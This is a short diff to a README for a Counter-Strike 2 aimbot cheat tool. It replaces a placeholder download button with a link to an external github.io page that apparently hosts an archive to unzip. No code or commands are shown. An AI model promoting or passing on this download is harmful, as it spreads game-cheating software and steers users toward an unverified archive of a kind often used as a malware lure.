@@ -6,7 +6,7 @@ CS 2 Aimbot is a precision aiming tool for Counter-Strike 2 that automatically a
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://cs2-aimbot-windows.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
